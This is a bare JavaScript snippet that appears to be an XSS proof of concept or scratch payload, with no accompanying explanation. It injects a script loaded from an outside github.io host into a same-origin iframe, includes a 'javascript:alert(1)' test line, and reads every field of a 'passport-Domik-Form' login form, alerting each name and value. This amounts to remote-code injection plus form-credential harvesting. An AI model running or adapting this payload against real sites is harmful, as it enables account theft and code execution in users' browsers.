document.createElement('div');

frame=document.createElement("iframe");
frame.src="/css/bootstrap.min.css";
document.body.appendChild(frame);
script=document.createElement('script');
script.src='//vasilevigor3.github.io/myjs.js';
window.frames[0].document.head.appendChild(script);

javascript:alert(1);
var iframeDocument = frame.contentWindow.document;

var formData = new FormData(iframeDocument.querySelector('form.passport-Domik-Form'))
for (const pair of formData.entries()) {
  alert(`${pair[0]}, ${pair[1]}`);
}
